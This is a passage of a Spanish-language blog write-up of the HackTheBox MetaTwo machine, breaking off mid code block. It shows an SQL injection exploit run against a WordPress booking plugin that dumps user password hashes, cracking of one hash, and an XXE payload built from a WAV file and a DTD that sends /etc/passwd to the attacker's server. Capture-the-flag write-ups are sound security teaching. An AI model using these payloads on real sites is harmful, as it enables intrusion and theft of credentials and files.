<!DOCTYPE html>













<html lang="es-ES"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  

  
    

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="MetaTwo WriteUp" />
<meta name="author" content="H4ckerLite" />
<meta property="og:locale" content="es_ES" />
<meta name="description" content="Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de Word Press, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de Word Press," />
<meta property="og:description" content="Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de Word Press, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de Word Press," />
<link rel="canonical" href="http://localhost:4000/posts/metatwo-writeup/" />
<meta property="og:url" content="http://localhost:4000/posts/metatwo-writeup/" />
<meta property="og:site_name" content="H4ckerLite Blog" />
<meta property="og:image" content="http://localhost:4000/assets/img/commons/metatwo-writeup/MetaTwo.png" />
<meta property="og:image:alt" content="MetaTWo WriteUp" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-20T17:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/metatwo-writeup/MetaTwo.png" />
<meta name="twitter:image:alt" content="MetaTWo WriteUp" />
<meta property="twitter:title" content="MetaTwo WriteUp" />
<meta name="twitter:site" content="@mortzelo" />
<meta name="twitter:creator" content="@H4ckerLite" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-03-29T23:27:02+02:00","datePublished":"2023-03-20T17:00:00+01:00","description":"Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de Word Press, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de Word Press,","headline":"MetaTwo WriteUp","image":{"alt":"MetaTWo WriteUp","url":"http://localhost:4000/assets/img/commons/metatwo-writeup/MetaTwo.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/metatwo-writeup/"},"url":"http://localhost:4000/posts/metatwo-writeup/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>MetaTwo WriteUp | H4ckerLite | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="H4ckerLite | Blog">
<meta name="application-name" content="H4ckerLite | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/favicons/avatar.ico" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">H4ckerLite | Blog</a>
    </div>
    <div class="site-subtitle font-italic">WriteUps, Pentesting</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>INICIO</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORÍAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ETIQUETAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ACERCA DE</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVO</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/H4ckerLite" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/mortzelo" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="https://app.hackthebox.com/profile/824495" aria-label="hackthebox"
        target="_blank" rel="noopener">
        <i class="fas fa-cube"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Inicio
            </a>
          </span>

        

      

        

      

        

          
            <span>MetaTwo WriteUp</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Entrada
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Buscar...">
    </span>
    <span id="search-cancel" >Cancelar</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4 pb-5">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->





<h1 data-toc-skip>MetaTwo WriteUp</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Publicado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1679328000"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-03-20
</em>

    </span>

    <!-- lastmod date -->
    
    <span>
      Actualizado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1680125222"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-03-29
</em>

    </span>
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="../../assets/img/commons/metatwo-writeup/MetaTwo.png" class="preview-img bg"
        alt="MetaTWo WriteUp"

      

       data-proofer-ignore>

      
        <figcaption class="text-center pt-2 pb-2">MetaTWo WriteUp</figcaption>
      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author -->
    <span>
      
      

      

      Por

      <em>
        
        H4ckerLite
        
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="2172 palabras">
  <em>12 min</em> de lectura</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Hoy toca compremeter la máquina <a href="https://app.hackthebox.com/machines/metatwo">MetaTwo</a> de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de  <code class="language-plaintext highlighter-rouge">Word Press</code>, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de <strong>Word Press</strong>,</p>

<h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="identificando-el-os"><span class="mr-2">Identificando el OS</span><a href="#identificando-el-os" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Enviando trazas <strong>ICMP</strong>  <code class="language-plaintext highlighter-rouge">(Internet Control Message Protocol)</code> y usando el <strong>TTL</strong><code class="language-plaintext highlighter-rouge">(Time to Live)</code> podemos identificar el OS.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>❯ ping <span class="nt">-c1</span> 10.10.11.186
PING 10.10.11.186 <span class="o">(</span>10.10.11.186<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.186: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>156 ms

<span class="nt">---</span> 10.10.11.186 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 156.106/156.106/156.106/0.000 ms
</pre></td></tr></tbody></table></code></div></div>

<h3 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Si realizamos un escaneo de puertos, encontramos:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>❯ nmap 10.10.11.186
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-24 12:53 <span class="nt">-04</span>
Nmap scan report <span class="k">for </span>10.10.11.186
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.43 seconds
</pre></td></tr></tbody></table></code></div></div>
<h3 id="analizando-la-web"><span class="mr-2">Analizando la Web</span><a href="#analizando-la-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Si intentamos acceder a la web, nos redirige, para solucionar esto hacemos:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'10.10.11.186   metapress.htb'</span> | <span class="nb">tee</span> <span class="nt">-a</span> /etc/hosts
</pre></td></tr></tbody></table></code></div></div>
<p>Cone esto arreglamos el problema de virtual hosting.</p>

<p><img data-src="/assets/img/commons/metatwo-writeup/1.png" alt="Web " class="center-image" data-proofer-ignore>
<em>Web</em></p>

<p>si ingresamos a la direcciñon que nos <a href="http://metapress.htb/events">muestra</a> vemos esto:</p>

<p><img data-src="/assets/img/commons/metatwo-writeup/2.png" alt="Events " class="center-image" data-proofer-ignore>
<em>Events</em></p>

<h3 id="cve-2022-0739"><span class="mr-2">CVE-2022-0739</span><a href="#cve-2022-0739" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Si miramos el código fuente vemos que usa el plugin <code class="language-plaintext highlighter-rouge">booking-press v1.0.10</code> con una importante (CVE))[https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357] si buscamos un exploit para esa versión, encontramos <a href="https://github.com/destr4ct/CVE-2022-0739">este</a> y este <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">otro</a>.</p>

<p>Creamos un evnto y en todos los campos de texto colocamos <code class="language-plaintext highlighter-rouge">bookingpress_form</code>.</p>

<p><img data-src="/assets/img/commons/metatwo-writeup/4.png" alt="Events " class="center-image" data-proofer-ignore>
<em>BookingPress</em></p>

<p>Ahora vemos el código fuente y buscamos por <code class="language-plaintext highlighter-rouge">once</code> y copiamos ese pin. Con el exploit que les compartí podemos dumpear la base de datos.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>❯ python3 exploit.py <span class="nt">-u</span> http://metapress.htb <span class="nt">-n</span> 30594111b0
- BookingPress PoC
<span class="nt">--</span> Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
<span class="nt">--</span> Count of <span class="nb">users</span>:  2
|admin|admin@metapress.htb|<span class="nv">$P$BGrGrgf2wToBS79i07Rk9sN4Fzk</span>.TV.|
|manager|manager@metapress.htb|<span class="nv">$P$B4aNM28N0E</span>.tMy/JIcnVMZbGcU16Q70|

</pre></td></tr></tbody></table></code></div></div>
<p>Ahora copiamos el hash y lo intentamos crakear con john.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P$ </span>or <span class="nv">$H$)</span> 256/256 AVX2 8x3]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 8192 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
partylikearockstar <span class="o">(</span>manager<span class="o">)</span>
1g 0:00:00:03 DONE <span class="o">(</span>2023-03-24 14:36<span class="o">)</span> 0.2617g/s 28950p/s 28950c/s 28950C/s poochini..music69
Use the <span class="s2">"--show --format=phpass"</span> options to display all of the cracked passwords reliably
Session completed
</pre></td></tr></tbody></table></code></div></div>
<p>Podemos autenticarnos con Word Press.</p>

<h2 id="comprometiendo-la-máquina"><span class="mr-2">Comprometiendo la máquina</span><a href="#comprometiendo-la-máquina" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Accedemos al panel de <a href="http://metapress.htb/wp-admin">WordPress</a>.</p>

<p><img data-src="/assets/img/commons/metatwo-writeup/5.png" alt="Events " class="center-image" data-proofer-ignore>
<em>WP Login</em></p>

<p>Si iniciamos sesión podemos ver la versión del <code class="language-plaintext highlighter-rouge">CMS</code> de WordPress.</p>

<p><img data-src="/assets/img/commons/metatwo-writeup/6.png" alt="Events " class="center-image" data-proofer-ignore>
<em>WP CMS</em></p>

<h3 id="cve-2021-29447"><span class="mr-2">CVE-2021-29447</span><a href="#cve-2021-29447" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Encontramos una manera de subir archivos multimedia.</p>

<p><img data-src="/assets/img/commons/metatwo-writeup/7.png" alt="Events " class="center-image" data-proofer-ignore>
<em>WAV</em></p>

<p>Existe una sala de (TryHackMe)[https://tryhackme.com/room/wordpresscve202129447] que nos enseñan esta vulnerabilidad. Creamos un archivo <code class="language-plaintext highlighter-rouge">.dtd</code> que intente leer el el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> convirtiendo la data en formato base64 y reciviendola con una petición <code class="language-plaintext highlighter-rouge">GET</code> en nuestro servidor.</p>

<p>Archivo <strong>.wav</strong>, recuerda cambiar tu IP de la VPN de HackTheBox.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="nt">-en</span> <span class="s1">'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '</span><span class="s2">"'"</span><span class="s1">'http://10.10.14.36/exploit.dtd'</span><span class="s2">"'"</span><span class="s1">'&gt;%remote;%init;%trick;]&gt;\x00'</span> <span class="o">&gt;</span> pwned.wav

</pre></td></tr></tbody></table></code></div></div>
<p>Nuestro archivo <code class="language-plaintext highlighter-rouge">exploit.dtd</code> le puedes llamar a tu gusto, pero recuerda cambiar la petición.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>❯ <span class="nb">cat </span>exploit.dtd
&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/etc/passwd"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span>ENTITY % init <span class="s2">"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.36/?p=%file;'&gt;"</span> <span class="o">&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Nos creamos un servidor PHP por el puerto 80 y observamos el resultado.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>php <span class="nt">-S</span> 0.0.0.0:80
</pre></td></tr></tbody></table></code></div></div>
<p><img data-src="/assets/img/commons/metatwo-writeup/8.png" alt="Events " class="center-image" data-proofer-ignore>
<em>Base64</em>
Bingo!, podemos leer el <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
